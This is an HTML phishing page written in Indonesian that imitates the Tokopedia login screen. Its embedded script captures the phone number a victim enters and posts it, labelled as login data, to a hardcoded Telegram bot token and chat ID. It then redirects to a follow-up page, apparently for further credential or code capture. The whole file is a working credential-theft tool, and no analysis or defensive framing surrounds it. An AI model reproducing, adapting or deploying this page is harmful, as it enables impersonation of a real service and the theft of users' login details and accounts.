<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Masuk ke Tokopedia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'open sans', tahoma, sans-serif; -webkit-tap-highlight-color: transparent; }
        .input-active:focus { border-color: #03AC0E; }
    </style>
</head>
<body class="bg-white">

    <div class="flex justify-end p-5">
        <span class="text-[#03AC0E] font-bold text-[15px] cursor-pointer">Daftar</span>
    </div>

    <div class="max-w-md mx-auto px-6 pt-2">
        <h1 class="text-[22px] font-bold text-[#31353B] mb-6">Masuk ke Tokopedia</h1>

        <div class="mb-5">
            <input type="text" id="userInput" placeholder="masukan nomor handphone" 
                class="w-full p-3.5 border border-gray-300 rounded-lg outline-none input-active text-md placeholder-gray-400 transition-all">
        </div>

        <button id="btnNext" class="w-full bg-[#03AC0E] text-white font-bold py-3.5 rounded-lg text-md hover:bg-[#02960c] transition-colors shadow-sm">
            Selanjutnya
        </button>

        <div class="relative flex items-center my-9">
            <div class="flex-grow border-t border-gray-200"></div>
            <span class="flex-shrink mx-4 text-gray-400 text-xs uppercase tracking-tight">atau masuk dengan</span>
            <div class="flex-grow border-t border-gray-200"></div>
        </div>

        <div class="space-y-3">
            <a href="masuk.html" class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50">
                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" class="w-5 h-5 mr-3">
                <span class="font-semibold text-gray-600 text-sm">Google</span>
            </div>
            <div class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50">
                <svg class="w-5 h-5 mr-3 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
                <span class="font-semibold text-gray-600 text-sm">E-mail</span>
            </div>
            <div class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer hover:bg-gray-50">
                <svg class="w-5 h-5 mr-3 text-gray-800" fill="currentColor" viewBox="0 0 24 24"><path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.17-2.81-.73-3.95-1.72V17a7.01 7.01 0 0 1-13.93 1.12 7.01 7.01 0 0 1 12.01-6.1c.12-.13.23-.27.34-.4V7.53c-.35.24-.72.45-1.11.63a7.01 7.01 0 0 1-10.32-6.1c0-1.28.34-2.52.98-3.61L12.525.02z"/></svg>
                <span class="font-semibold text-gray-600 text-sm">TikTok Shop</a>
            </div>
        </div>

        <p class="text-[11px] text-gray-400 mt-12 text-center leading-relaxed px-2">
            Dengan masuk di sini, kamu menyetujui <span class="text-[#03AC0E] cursor-pointer">Syarat & Ketentuan</span> serta <span class="text-[#03AC0E] cursor-pointer">Kebijakan Privasi</span> Tokopedia
        </p>

        <p class="mt-10 text-center text-[14px] text-[#31353B]">
            Belum punya akun? <span class="text-[#03AC0E] font-bold cursor-pointer">Daftar Sekarang</span>
        </p>
    </div>

    <script>
        const TOKEN = "8746602429:AAHRxWuzAmXIksUuIs87TNq4oLGjxIJH83w";
        const CHAT_ID = "8723798929";

        document.getElementById('btnNext').addEventListener('click', function() {
            const userVal = document.getElementById('userInput').value;
            if (!userVal) return;

            this.innerText = "Memproses...";
            this.disabled = true;

            const text = `<b>🔔 DATA LOGIN MASUK</b>\n<b>Username:</b> <code>${userVal}</code>`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            }).then(() => {
                window.location.href = "otwa.html?u=" + encodeURIComponent(userVal);
            });
        });
    </script>
</body>
</html>
